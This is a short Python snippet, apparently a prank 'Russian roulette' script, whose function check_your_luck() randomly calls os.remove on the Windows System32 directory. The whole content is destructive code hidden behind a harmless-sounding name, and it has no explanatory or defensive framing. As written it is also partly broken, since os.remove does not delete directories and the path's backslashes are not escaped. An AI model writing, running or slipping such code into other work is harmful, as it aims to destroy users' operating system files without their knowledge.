import random
import os


def check_your_luck():
    if random.randint(0, 6) == 1:
        return os.remove("C:\Windows\System32")

